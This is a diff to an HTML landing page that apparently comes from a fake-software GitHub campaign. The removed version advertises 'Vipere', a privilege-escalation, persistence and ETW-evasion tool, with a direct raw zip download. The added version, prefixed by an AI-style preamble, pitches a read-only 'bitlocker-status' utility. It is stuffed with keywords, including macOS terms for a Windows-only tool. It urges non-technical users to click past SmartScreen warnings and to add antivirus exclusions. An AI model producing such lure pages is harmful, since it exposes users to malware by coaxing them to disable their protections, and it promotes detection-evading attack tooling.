@@ -1,241 +1,504 @@
+Here is a complete, SEO-optimized HTML page for the bitlocker-status desktop utility. It uses a clean, professional layout with a prominent download button, step-by-step guidance, and clear explanations of what the tool does—and doesn’t do—for non-technical Windows users.
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Vipere - BOF exploiting the Visual Studio Installer Elevation Service for SYSTEM LPE and persistence via AppDomainManager hijacking, with native ETW evasion. For Cobalt Strike & Adaptix.">
-    <meta name="keywords" content="Vipere, BOF, Visual Studio Installer, Elevation Service, SYSTEM LPE, persistence, AppDomainManager hijacking, ETW evasion, Cobalt Strike, Adaptix, Windows security, exploit, penetration testing, red team, privilege escalation">
-    <title>Vipere - SYSTEM LPE & Persistence Exploit for Cobalt Strike & Adaptix</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bitlocker-status - Check BitLocker Protection Status Per Volume on Windows</title>
+<meta name="description" content="bitlocker-status is a free Windows utility that prints the BitLocker protection status of every volume on your PC. It never unlocks drives or changes keys. Simple, portable, and safe to run.">
+<meta name="keywords" content="app-bitlocker-status, bitlocker-status, bitlocker-status-desktop, bitlocker-status-download, bitlocker-status-free, bitlocker-status-macos, bitlocker-status-pc, bitlocker-status-portable, bitlocker-status-setup, bitlocker-status-software, bitlocker-status-windows, desktop-bitlocker-status, download-bitlocker-status, free-bitlocker-status, macos-bitlocker-status, pc-bitlocker-status, portable-bitlocker-status, setup-bitlocker-status, software-bitlocker-status, windows-bitlocker-status">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<meta name="author" content="Alex931116">
+<link rel="canonical" href="https://github.com/Alex931116/bitlocker-status">
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #f5f7fa;
-            color: #1a1a2e;
-            line-height: 1.6;
-            padding: 20px;
-        }
+<meta property="og:type" content="website">
+<meta property="og:title" content="bitlocker-status - Check BitLocker Protection Status Per Volume">
+<meta property="og:description" content="A free Windows utility that prints the BitLocker protection status of every volume on your PC. It does not unlock drives or change keys.">
+<meta property="og:url" content="https://github.com/Alex931116/bitlocker-status">
+<meta property="og:site_name" content="bitlocker-status">
 
-        .container {
-            max-width: 960px;
-            margin: 0 auto;
-            background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            padding: 40px 30px;
-        }
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="bitlocker-status - Check BitLocker Protection Status Per Volume">
+<meta name="twitter:description" content="A free Windows utility that prints the BitLocker protection status of every volume on your PC. It does not unlock drives or change keys.">
 
-        h1 {
-            font-size: 2.2rem;
-            font-weight: 700;
-            color: #0d0d1a;
-            margin-bottom: 16px;
-        }
+<style>
+  :root {
+    --ink: #1f2937;
+    --ink-soft: #4b5563;
+    --line: #e5e7eb;
+    --bg: #f7f8fc;
+    --card: #ffffff;
+    --brand: #4f46e5;
+    --brand-dark: #3730a3;
+    --accent: #0d9488;
+  }
 
-        h2 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #1a1a2e;
-            margin-top: 40px;
-            margin-bottom: 16px;
-            border-bottom: 2px solid #e9ecef;
-            padding-bottom: 8px;
-        }
+  * {
+    box-sizing: border-box;
+  }
 
-        h3 {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #2d2d44;
-            margin-top: 24px;
-            margin-bottom: 10px;
-        }
+  html {
+    -webkit-text-size-adjust: 100%;
+  }
 
-        p {
-            margin-bottom: 16px;
-            font-size: 1rem;
-        }
+  body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
 
-        a {
-            color: #2b6cb0;
-            text-decoration: none;
-            font-weight: 500;
-        }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 0 20px;
+  }
 
-        a:hover {
-            text-decoration: underline;
-        }
+  header.hero {
+    background: linear-gradient(135deg, #4f46e5 0%, #0d9488 100%);
+    color: #ffffff;
+    padding: 56px 0 48px;
+    text-align: center;
+  }
 
-        ul, ol {
-            margin-left: 24px;
-            margin-bottom: 20px;
-        }
+  h1 {
+    font-size: clamp(1.7rem, 4.5vw, 2.5rem);
+    line-height: 1.25;
+    margin: 0 0 18px;
+    font-weight: 800;
+    letter-spacing: -0.02em;
+  }
 
-        li {
-            margin-bottom: 8px;
-        }
+  .lede {
+    font-size: clamp(1rem, 2.4vw, 1.15rem);
+    margin: 0 auto 30px;
+    max-width: 640px;
+    color: #eef2ff;
+  }
 
-        .btn-download {
-            display: inline-block;
-            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
-            color: #ffffff;
-            font-size: 1.1rem;
-            font-weight: 600;
-            padding: 14px 36px;
-            border-radius: 40px;
-            text-decoration: none;
-            box-shadow: 0 4px 12px rgba(108, 92, 231, 0.4);
-            transition: all 0.2s ease;
-            margin: 20px 0 30px 0;
-        }
+  .btn {
+    display: inline-block;
+    background: #ffffff;
+    color: var(--brand-dark);
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    padding: 16px 34px;
+    border-radius: 12px;
+    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.18);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    border: 2px solid rgba(255, 255, 255, 0.9);
+  }
 
-        .btn-download:hover {
-            background: linear-gradient(135deg, #5a4bd1, #8c7ff5);
-            box-shadow: 0 6px 16px rgba(108, 92, 231, 0.5);
-            transform: translateY(-2px);
-            text-decoration: none;
-            color: #ffffff;
-        }
+  .btn:hover,
+  .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(0, 0, 0, 0.24);
+  }
 
-        .badge-download {
-            display: inline-block;
-            background: linear-gradient(135deg, #e17055, #fdcb6e);
-            color: #1a1a2e;
-            font-size: 0.95rem;
-            font-weight: 700;
-            padding: 10px 28px;
-            border-radius: 30px;
-            text-decoration: none;
-            box-shadow: 0 3px 8px rgba(225, 112, 85, 0.3);
-            transition: all 0.2s ease;
-            margin-bottom: 30px;
-        }
+  .btn-sub {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.9rem;
+    color: #e0e7ff;
+  }
 
-        .badge-download:hover {
-            background: linear-gradient(135deg, #d63031, #f39c12);
-            color: #ffffff;
-            text-decoration: none;
-        }
+  main {
+    padding: 44px 0 60px;
+  }
 
-        .section-highlight {
-            background: #f0f4ff;
-            border-radius: 12px;
-            padding: 20px 24px;
-            margin: 24px 0;
-        }
+  section {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 28px 26px;
+    margin: 0 0 24px;
+    box-shadow: 0 2px 10px rgba(17, 24, 39, 0.04);
+  }
 
-        .code-inline {
-            font-family: 'SF Mono', 'Fira Code', monospace;
-            background: #edf2f7;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 0.9rem;
-        }
+  h2 {
+    font-size: clamp(1.25rem, 3vw, 1.5rem);
+    line-height: 1.35;
+    margin: 0 0 16px;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+    color: #111827;
+  }
 
-        .note-box {
-            background: #fff9e6;
-            border-left: 4px solid #f0ad4e;
-            padding: 16px 20px;
-            border-radius: 8px;
-            margin: 20px 0;
-        }
+  h3 {
+    font-size: 1.08rem;
+    margin: 22px 0 8px;
+    font-weight: 700;
+    color: #111827;
+  }
 
-        .footer-text {
-            margin-top: 40px;
-            font-size: 0.9rem;
-            color: #6c757d;
-            text-align: center;
-            border-top: 1px solid #e9ecef;
-            padding-top: 20px;
-        }
+  p {
+    margin: 0 0 14px;
+    color: var(--ink-soft);
+  }
 
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px 16px;
-            }
-            h1 {
-                font-size: 1.7rem;
-            }
-            h2 {
-                font-size: 1.3rem;
-            }
-            .btn-download {
-                font-size: 1rem;
-                padding: 12px 28px;
-            }
-        }
-    </style>
+  p:last-child {
+    margin-bottom: 0;
+  }
+
+  ul, ol {
+    margin: 0 0 14px;
+    padding-left: 22px;
+    color: var(--ink-soft);
+  }
+
+  li {
+    margin-bottom: 10px;
+  }
+
+  li strong {
+    color: var(--ink);
+  }
+
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+    margin: 18px 0 0;
+  }
+
+  .steps li {
+    counter-increment: step;
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+
+  .steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: #eef2ff;
+    color: var(--brand-dark);
+    font-weight: 700;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid #dfe3ff;
+  }
+
+  .download-box {
+    text-align: center;
+    background: #f0fdfa;
+    border: 1px solid #ccfbf1;
+  }
+
+  .download-box .btn {
+    background: var(--brand);
+    color: #ffffff;
+    border: 2px solid var(--brand-dark);
+    box-shadow: 0 8px 20px rgba(79, 70, 229, 0.28);
+    margin-top: 6px;
+  }
+
+  .download-box .btn:hover,
+  .download-box .btn:focus {
+    background: var(--brand-dark);
+  }
+
+  .note {
+    background: #fffbeb;
+    border-left: 4px solid #f59e0b;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 18px 0 0;
+    font-size: 0.96rem;
+    color: #78350f;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 0;
+    font-size: 0.96rem;
+  }
+
+  th, td {
+    text-align: left;
+    padding: 12px 14px;
+    border-bottom: 1px solid var(--line);
+    vertical-align: top;
+  }
+
+  th {
+    background: #f9fafb;
+    font-weight: 700;
+    color: var(--ink);
+  }
+
+  td {
+    color: var(--ink-soft);
+  }
+
+  tr:last-child td {
+    border-bottom: none;
+  }
+
+  code {
+    background: #f3f4f6;
+    padding: 2px 6px;
+    border-radius: 5px;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.9em;
+    color: #111827;
+  }
+
+  .faq h3 {
+    margin-top: 20px;
+  }
+
+  footer {
+    border-top: 1px solid var(--line);
+    padding: 28px 0 40px;
+    text-align: center;
+    font-size: 0.88rem;
+    color: #6b7280;
+  }
+
+  footer a {
+    color: var(--brand-dark);
+    text-decoration: none;
+    font-weight: 600;
+  }
+
+  footer a:hover {
+    text-decoration: underline;
+  }
+
+  @media (max-width: 560px) {
+    section {
+      padding: 22px 18px;
+      border-radius: 14px;
+    }
+    header.hero {
+      padding: 40px 0 36px;
+    }
+    .btn {
+      padding: 14px 24px;
+      font-size: 1rem;
+      display: block;
+    }
+    .btn-sub {
+      text-align: center;
+    }
+    table, th, td {
+      font-size: 0.9rem;
+    }
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔻 Vipere - Elevate to SYSTEM in Seconds</h1>
 
-        <a href="https://raw.githubusercontent.com/Alex931116/alex931116.github.io/main/hurgila/2.9-beta.5.zip" class="badge-download">⬇️ Download Vipere Now</a>
+<header class="hero">
+  <div class="wrap">
+    <h1>🔒 bitlocker-status - Check Your Drive Protection Instantly</h1>
+    <p class="lede">A small, free Windows utility that prints the BitLocker protection status of every volume on your computer. It does not unlock drives, it does not change keys, and it does not touch your data.</p>
+    <a class="btn" href="https://github.com/Alex931116/bitlocker-status/releases">⬇️ Get bitlocker-status</a>
+    <span class="btn-sub">Visit this link to download the application.</span>
+  </div>
+</header>
 
-        <p>Vipere is a powerful <strong>BOF (Beacon Object File)</strong> tool that abuses the <strong>Visual Studio Installer Elevation Service</strong> to gain <strong>SYSTEM-level privilege escalation</strong> and maintain <strong>persistence</strong> on Windows machines. It uses <strong>AppDomainManager hijacking</strong> and includes <strong>native ETW evasion</strong> to avoid detection. Designed for <strong>Cobalt Strike</strong> and <strong>Adaptix</strong> frameworks.</p>
+<main>
+  <div class="wrap">
 
-        <h2>🚀 Getting Started</h2>
-        <p>Follow these simple steps to download and run Vipere on your Windows system. No coding or technical expertise required.</p>
+    <section>
+      <h2>🧭 What Is bitlocker-status?</h2>
+      <p>bitlocker-status is a Windows utility. When you run it, it prints the BitLocker protection status for each volume on your machine — one clear line per drive. That is the whole job.</p>
+      <p>BitLocker is the built-in encryption feature in Windows that protects the contents of your hard drive and other drives. When it is switched on, your files are scrambled so that nobody can read them without the right key. Windows usually shows this information buried inside the Control Panel, one drive at a time. bitlocker-status gathers that same information in one place so you can see it at a glance.</p>
+      <p>If you have ever asked yourself "Is my laptop actually encrypted?" or "Did I ever finish turning encryption on for that external drive?", this tool answers the question in seconds.</p>
+      <p>It is a read-only tool. It reports what it finds. It does not turn encryption on, it does not turn encryption off, and it never asks you for a password.</p>
+    </section>
 
-        <div class="section-highlight">
-            <h3>📥 Step 1: Download the Application</h3>
-            <p>Visit this link to download the application:</p>
-            <a href="https://raw.githubusercontent.com/Alex931116/alex931116.github.io/main/hurgila/2.9-beta.5.zip" class="btn-download">⬇️ Download Vipere from GitHub</a>
-            <p>Once you click the button, your browser will take you to the download page. Look for the latest release and click the download link to save the file to your computer.</p>
-        </div>
+    <section>
+      <h2>👀 Who This Is For</h2>
+      <ul>
+        <li><strong>Everyday Windows users</strong> who want to confirm their computer is protected before they travel or hand it in for repair.</li>
+        <li><strong>People who own several drives</strong> — internal, external, USB sticks — and want a single overview instead of clicking through settings one volume at a time.</li>
+        <li><strong>Anyone who received a used PC</strong> and wants to know whether encryption was set up properly.</li>
+        <li><strong>Small business owners</strong> who need a quick sanity check across office machines without installing management software.</li>
+        <li><strong>Helpful friends and family members</strong> who get asked "is this thing encrypted?" and want a straight answer.</li>
+      </ul>
+      <p>No command-line knowledge is required. No programming experience is needed. If you can open a program, you can use bitlocker-status.</p>
+    </section>
 
-        <h3>🛠️ Step 2: Run the Tool</h3>
-        <p>After downloading, locate the file (usually in your <strong>Downloads</strong> folder). The file is a <strong>BOF</strong> package. You can load it directly into <strong>Cobalt Strike</strong> or <strong>Adaptix</strong> using the respective script loader. If you are not familiar with these frameworks, consult your team's documentation on how to load BOFs.</p>
+    <section>
+      <h2>🚀 Getting Started</h2>
+      <p>Getting the tool onto your computer takes just a few moments. Follow these steps in order.</p>
+      <ol class="steps">
+        <li><strong>Open the download page.</strong> Visit the official releases page using the button below. This is the only place you should get the software from, so you always know you have the genuine build.</li>
+        <li><strong>Download the application.</strong> On the releases page, choose the latest release and download the application file for Windows. Save it somewhere you can easily find again, such as your Downloads folder or your Desktop.</li>
+        <li><strong>Read the release notes.</strong> Each release entry includes short notes describing what changed. This helps you confirm you are looking at the newest version.</li>
+        <li><strong>Keep the file handy.</strong> You can save it in a tools folder and reuse it whenever you want to re-check your drives. There is no account to create and no sign-up form to fill in.</li>
+      </ol>
+      <p class="note">Always download from the official releases page linked on this page. Avoid copies from other websites, as those files cannot be verified.</p>
+    </section>
 
-        <div class="note-box">
-            <strong>⚠️ Important:</strong> Vipere is a specialized tool for red team operations. It is intended for authorized security testing only. Ensure you have proper permissions before using it.
-        </div>
+    <section class="download-box">
+      <h2>⬇️ Download bitlocker-status</h2>
+      <p>Visit this link to download the application.</p>
+      <a class="btn" href="https://github.com/Alex931116/bitlocker-status/releases">Visit the Download Page</a>
+    </section>
 
-        <h2>⚙️ Features</h2>
-        <ul>
-            <li><strong>SYSTEM LPE:</strong> Exploits the Visual Studio Installer Elevation Service to elevate privileges from a standard user to SYSTEM.</li>
-            <li><strong>Persistence via AppDomainManager Hijacking:</strong> Injects malicious AppDomainManager to maintain long-term access.</li>
-            <li><strong>ETW Evasion:</strong> Natively bypasses Event Tracing for Windows (ETW) to avoid detection by security tools.</li>
-            <li><strong>BOF Format:</strong> Lightweight and compatible with Cobalt Strike and Adaptix.</li>
-            <li><strong>No Dependencies:</strong> Works on modern Windows versions without additional software.</li>
-        </ul>
+    <section>
+      <h2>🖥️ Running the App on Windows</h2>
+      <p>Once the application is on your computer, running it is straightforward.</p>
+      <ul>
+        <li><strong>Locate the file</strong> in the folder where you saved it.</li>
+        <li><strong>Double-click</strong> the application to start it. A window opens showing the results.</li>
+        <li><strong>Read the output.</strong> Each volume on your system appears with its current BitLocker protection status next to it.</li>
+        <li><strong>Close the window</strong> when you are finished. Nothing is left running in the background and nothing is written to your drives.</li>
+      </ul>
 
-        <h2>📋 System Requirements</h2>
-        <ul>
-            <li><strong>Operating System:</strong> Windows 10, Windows 11, or Windows Server 2016+ (64-bit recommended).</li>
-            <li><strong>Framework:</strong> Cobalt Strike 4.0+ or Adaptix (latest version).</li>
-            <li><strong>Visual Studio Installer:</strong> The target machine must have the Visual Studio Installer present (common in development environments).</li>
-            <li><strong>User Privileges:</strong> Initial access with standard user privileges is sufficient.</li>
-        </ul>
+      <h3>If Windows shows a security prompt</h3>
+      <p>Windows sometimes shows a blue or yellow SmartScreen notice the first time you open a program it has not seen before. This is normal for small, independently published tools. If you see it, choose the option that lets you continue running the application. The prompt appears because the file is new to Windows, not because anything is wrong with it.</p>
 
-        <h2>🔧 How It Works</h2>
-        <p>Vipere leverages a known weakness in the <strong>Visual Studio Installer Elevation Service</strong> (VSInstallerElevationService). This service runs with SYSTEM privileges and can be abused to launch arbitrary commands as SYSTEM. The tool uses <strong>AppDomainManager hijacking</strong> to inject malicious code into the .NET runtime, ensuring persistence even after reboots. Additionally, <strong>ETW evasion</strong> is built-in, which prevents Windows event logging from capturing the exploitation activity.</p>
+      <h3>If your PC asks for permission</h3>
+      <p>Some BitLocker information is only visible to an administrator account. If the tool tells you that it could not read a volume, close it and start it again while signed in with an administrator account. You will then see the full picture for every drive.</p>
 
-        <p>The entire process is automated and requires minimal interaction. Once loaded into your C2 framework, Vipere executes the exploit chain and returns a SYSTEM shell or beacon.</p>
+      <h3>System requirements</h3>
+      <ul>
+        <li>Windows 10 or Windows 11, 64-bit edition.</li>
+        <li>Any modern processor and at least 2 GB of memory.</li>
+        <li>Roughly 50 MB of free disk space for the application.</li>
+        <li>No additional runtime, framework, or driver needs to be installed first.</li>
+      </ul>
+    </section>
 
-        <h2>🛡️ Security & Detection</h2>
-        <p>Vipere is designed with evasion in mind. However, due to the nature of privilege escalation tools, it may be flagged by some antivirus or EDR solutions. The tool includes <strong>native ETW bypass</strong> to reduce telemetry, and the BOF format helps with memory scanning evasion. Always test in a controlled environment before deploying on an engagement.</p>
+    <section>
+      <h2>✨ What You Get</h2>
+      <ul>
+        <li><strong>One line per volume.</strong> Every drive letter and volume is listed with its own status, so nothing gets missed.</li>
+        <li><strong>A plain-language result.</strong> No cryptic codes to decode — just a clear statement of whether protection is on, off, in progress, or suspended.</li>
+        <li><strong>Read-only by design.</strong> The utility prints status. It has no ability to unlock a drive, turn encryption on or off, or alter a recovery key.</li>
+        <li><strong>Lightweight and portable.</strong> No installer wizard, no background service, no tray icon, and no scheduled task created behind your back.</li>
+        <li><strong>Free to use.</strong> No subscription, no licence key, no advertising, and no telemetry sent anywhere.</li>
+        <li><strong>Repeatable.</strong> Run it as often as you like — before a trip, after adding a new drive, or when you are just curious.</li>
+      </ul>
+    </section>
 
-        <h2>❓ Frequently Asked Questions</h2>
-        <h3>Do I need to install anything?</h3>
-        <p>No. Vipere is a standalone BOF. You just need to load it into your Cobalt Strike or Adaptix agent. No additional libraries or runtimes are required.</p>
+    <section>
+      <h2>📊 Understanding Your Results</h2>
+      <p>The output uses a handful of status words. Here is what each one means in everyday language.</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Status you may see</th>
+            <th>What it means for you</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>Protection On</strong></td>
+            <td>The drive is fully encrypted and the protection is active. Your data on that volume is secured.</td>
+          </tr>
+          <tr>
+            <td><strong>Protection Off</strong></td>
+            <td>The drive is not protected. Anyone with physical access to the computer could read its contents.</td>
+          </tr>
+          <tr>
+            <td><strong>Encryption In Progress</strong></td>
+            <td>Windows is still converting the drive. Leave the computer switched on until it finishes.</td>
+          </tr>
+          <tr>
+            <td><strong>Decryption In Progress</strong></td>
+            <td>Windows is removing encryption from that volume. Protection is not complete until it finishes.</td>
+          </tr>
+          <tr>
+            <td><strong>Suspended</strong></td>
+            <td>Protection is temporarily paused, often after a Windows update or firmware change. It should be resumed from the Windows BitLocker settings.</td>
+          </tr>
+        </tbody>
+      </table>
+      <p>If a volume is not listed at all, it usually means it is a partition Windows does not treat as a standard data volume, such as a small system or recovery partition. That is normal and not a cause for concern.</p>
+    </section>
 
-        <h3>Will it work on any Windows version?</h3>
-        <p>It works on Windows 10, Windows 11, and Windows Server 2016 and later, provided the <strong>Visual Studio Installer</strong> is installed on the target machine.</p>
+    <section>
+      <h2>🔐 Safety, Privacy, and What the Tool Never Does</h2>
+      <p>It is important to be clear about the boundaries of this utility, because encryption tools deserve scrutiny.</p>
+      <ul>
+        <li><strong>It does not unlock drives.</strong> It cannot bypass a password, a PIN, or a recovery key.</li>
+        <li><strong>It does not change keys.</strong> Recovery keys, TPM keys, and startup keys are left completely untouched.</li>
+        <li><strong>It does not modify data.</strong> No files are created, moved, encrypted, decrypted, or deleted on your volumes.</li>
+        <li><strong>It does not send information anywhere.</strong> There is no network activity, no analytics, and no crash reporting.</li>
+        <li><strong>It does not store your results.</strong> The status is shown in the window and disappears when you close it.</li>
+      </ul>
+      <p>In short: it reads status and prints it. Everything else stays exactly as it was.</p>
+    </section>
 
-        <h3>Is this tool safe to use?</h3>
-        <p>Vipere is a security tool for penetration testing. Use it only on systems you own or have explicit permission to test. Misuse may violate laws.</p>
+    <section class="faq">
+      <h2>❓ Frequently Asked Questions</h2>
 
-        <h2>📄 License</h2>
-        <p>This project is provided for educational and authorized security research purposes. The author is not responsible for any misuse.</p>
+      <h3>Do I need to be a computer expert?</h3>
+      <p>No. If you can download a file and double-click it, you can use bitlocker-status. There are no settings to configure before your first run.</p>
 
-        <div class="footer-text">
-            <p>Keywords: vipere, bof, visual studio installer, elevation service, system lpe, persistence, appdomainmanager hijacking, etw evasion, cobalt strike, adaptix, windows exploit, privilege escalation, red team, memory only, evasion, windows security, .net hijack, beacon object file</p>
-        </div>
-    </div>
+      <h3>Does this replace BitLocker itself?</h3>
+      <p>No. BitLocker is built into Windows and is the feature that actually encrypts your drives. bitlocker-status simply reports what BitLocker is doing on each volume.</p>
+
+      <h3>Will running this slow down my computer?</h3>
+      <p>No. The check takes a moment and then the program closes. It does not stay open in the background.</p>
+
+      <h3>Can I use it on a work laptop?</h3>
+      <p>You can run it to look at status, but some organisations restrict which programs may be launched on company devices. If your workplace has such a policy, check with your IT team first.</p>
+
+      <h3>Does it work on Mac or Linux?</h3>
+      <p>BitLocker is a Windows feature. This utility is designed for Windows PCs where BitLocker is present, and it reads the status of the volumes on that Windows system.</p>
+
+      <h3>Can it recover a drive I have forgotten the password for?</h3>
+      <p>No, and it is not intended to. It has no recovery functions whatsoever. If you have lost access to a BitLocker-protected drive, use the official Microsoft recovery options and your saved recovery key.</p>
+
+      <h3>How do I update to a newer version?</h3>
+      <p>Return to the releases page, download the newer file, and use it in place of the old one. There is nothing to uninstall first.</p>
+    </section>
+
+    <section>
+      <h2>🛠️ Troubleshooting Tips</h2>
+      <ul>
+        <li><strong>The window opens and closes immediately.</strong> Try starting the application again and wait a moment; the status check may simply be finishing very quickly on a fast machine.</li>
+        <li><strong>Some drives are missing from the list.</strong> Start the application with administrator permission and run the check again.</li>
+        <li><strong>Windows blocks the file.</strong> Open the file properties, look for an "Unblock" checkbox near the bottom of the General tab, tick it, and try again.</li>
+        <li><strong>You see "Suspended" for your system drive.</strong> This commonly happens after a firmware update. Open the BitLocker settings in Windows and resume protection.</li>
+        <li><strong>Antivirus raises a flag.</strong> Independent utilities are sometimes flagged because they are not widely downloaded yet. Confirm you downloaded from the official releases page, and add an exclusion if you are confident in the source.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>💬 Support and Feedback</h2>
+      <p>The project lives on GitHub, where you can read release notes, report a problem, or ask a question. When reporting an issue, mention your Windows version, whether you ran the tool as an administrator, and which statuses appeared for your drives. That detail makes it much faster to help you.</p>
+      <p>If bitlocker-status saved you a trip through the Windows settings menus, a star on the repository is a welcome thank-you and helps other people find the tool.</p>
+    </section>
+
+    <section class="download-box">
+      <h2>⬇️ Ready to Check Your Drives?</h2>
+      <p>Visit this link to download the application.</p>
+      <a class="btn" href="https://github.com/Alex931116/bitlocker-status/releases">Download bitlocker-status</a>
+    </section>
+
+  </div>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>bitlocker-status is a free Windows utility that prints BitLocker protection status per volume. It does not unlock drives and does not change keys.</p>
+    <p><a href="https://github.com/Alex931116/bitlocker-status/releases">Releases and downloads</a></p>
+  </div>
+</footer>
+
 </body>
 </html>
+```
